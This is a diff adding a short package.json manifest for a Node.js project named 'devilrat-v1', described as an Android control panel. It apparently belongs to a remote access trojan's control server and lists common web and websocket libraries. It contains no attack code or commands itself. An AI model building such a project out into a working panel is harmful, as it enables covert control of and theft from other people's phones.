@@ -1,0 +1,16 @@
+{
+  "name": "devilrat-v1",
+  "version": "1.0.0",
+  "description": "DEVILRAT V1 - Ultimate Android Control Panel",
+  "main": "index.js",
+  "scripts": {"start": "node index.js"},
+  "dependencies": {
+    "express": "^4.18.2",
+    "socket.io": "^4.7.2",
+    "cors": "^2.8.5",
+    "uuid": "^9.0.0",
+    "ws": "^8.13.0"
+  },
+  "author": "piwzsky",
+  "license": "NULL"
+}
